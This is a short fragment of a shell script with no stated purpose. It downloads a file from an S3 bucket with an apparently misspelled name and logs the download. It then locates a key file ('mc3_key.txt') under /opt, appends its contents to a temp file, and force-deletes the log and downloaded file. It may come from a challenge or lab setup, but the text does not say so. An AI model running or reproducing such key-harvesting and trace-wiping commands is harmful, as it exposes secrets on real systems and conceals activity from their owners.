...
wget -a /tmp/logfile https://suportfiles.s3.amazonaws.com/trash/reciept.png
cat /tmp/logfile | grep 1154062 | tail -n1 | awk '{print \$3,\$4}' >>/tmp/end1.txt
cat /tmp/end1.txt | xargs echo \$(find /opt/ -name mc3_key.txt -exec cat '{}' \;) >>/tmp/end.txt
rm -vf /tmp/logfile /root/reciept.png /tmp/end1.txt
